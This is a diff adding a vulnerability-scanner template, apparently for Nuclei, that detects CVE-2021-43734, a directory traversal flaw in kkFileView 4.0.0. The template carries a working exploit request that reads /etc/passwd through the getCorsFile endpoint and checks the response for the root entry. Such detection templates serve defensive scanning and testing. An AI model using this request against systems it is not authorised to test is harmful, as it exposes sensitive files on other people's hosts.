@@ -1,0 +1,30 @@
+id: cve-2021-43734
+info:
+  name: kkFileView getCorsFile API Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    kkFileView v4.0.0 has a directory traversal vulnerability that allows arbitrary file reading, potentially leading to sensitive file leakage on the host.
+  reference:
+    - https://github.com/kekingcn/kkFileView/issues/304
+    - https://kkfileview.keking.cn/zh-cn/index.html
+  classification:
+    cve-id: CVE-2021-43734
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        GET /getCorsFile?urlPath=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
